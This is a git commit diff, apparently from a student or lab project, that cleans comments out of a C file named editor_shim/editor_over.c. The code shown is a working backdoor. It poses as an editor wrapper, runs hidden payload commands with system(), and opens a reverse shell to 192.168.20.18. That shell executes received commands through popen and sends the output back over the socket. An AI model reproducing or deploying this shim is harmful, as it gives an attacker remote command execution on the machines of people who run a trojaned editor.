4ad1c03fb1514fea3eab6361d6c8a1db6ec900da
Michael Burke <mdb5315@rit.edu>
2022-02-18 13:30:41 -0500

    removed comments

--- editor_shim/editor_over.c
+++ editor_shim/editor_over.c
@@ -21,8 +21,7 @@ int establishConnection(int port, int shell) {
     int sock = 0, valread;
     struct sockaddr_in serv_addr;
     char buffer[1024] = {0};
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-    {
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         printf("\n Socket creation error \n");
         return -1;
     }
@@ -30,23 +29,16 @@ int establishConnection(int port, int shell) {
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(port);
     // Convert IPv4 and IPv6 addresses from text to binary form
-    if(inet_pton(AF_INET, "192.168.20.18", &serv_addr.sin_addr)<=0) 
-    {
-        //printf("\nInvalid address/ Address not supported \n");
+    if(inet_pton(AF_INET, "192.168.20.18", &serv_addr.sin_addr)<=0) {
         return -1;
     }
    
-    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
-    {
-        //printf("\nConnection Failed \n");
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
         return -1;
     }
-    //send(sock , hello , strlen(hello) , 0 );
-    //printf("Hello message sent\n");
     
     if (shell == 1){
         while ((valread = recv(sock , buffer , 1024 , 0)) > 0){
-            //exeCmd(buffer);
             char line[1024];
             //Remove trailing newline
             buffer[strcspn(buffer, "\n")] = 0;
@@ -55,38 +47,20 @@ int establishConnection(int port, int shell) {
             FILE* fp = popen(buffer, "r");
             while((fgets(line, 1024, fp))) {
                 write(sock , line , strlen(line));
-                //printf("\n[%s]",line);
             }
             FILE* err = fopen(ERROR, "r");
             while((fgets(line, 1024, err))) {
                 write(sock , line , strlen(line));
-                //printf("\n[%s]",line);
             }
             char tmpcmd[50] = "rm -f ";
             strcat(tmpcmd, ERROR);
             system(tmpcmd);
-            //pclose(fp);
-            //write(sock, client_message , strlen(client_message));
         }
-        //printf("Connection closed");
     } else {
         valread = read( sock , buffer, 1024);
         establishConnection(atoi(buffer), 1);
     }
-    /*printf("uhh");
-    char str[1024];
-    printf(buffer);
-    printf("%s\n",buffer );*/
     return 0;
-}
-
-void chopN(char *str, size_t n)
-{
-    assert(n != 0 && str != 0);
-    size_t len = strlen(str);
-    if (n > len)
-        return;  // Or: n = len;
-    memmove(str, str+n, len - n + 1);
 }
 
 int install(char *fname){
@@ -136,16 +110,13 @@ int main (int argc, char *argv[]) {
         strcat(cmd1, PAYLOAD);
         strcat(cmd2, " &");
         strcat(cmd3, PAYLOAD);
-        // printf("%s\n", cmd1);
-        // printf("%s\n", cmd2);
-        // printf("%s\n", cmd3);
         system(cmd1);
         system(cmd2);
         sleep(0.1);
         system(cmd3);
         system(args);
     } else {
-        establishConnection(5003, 0);
+        establishConnection(5004, 0);
     }
     
 }
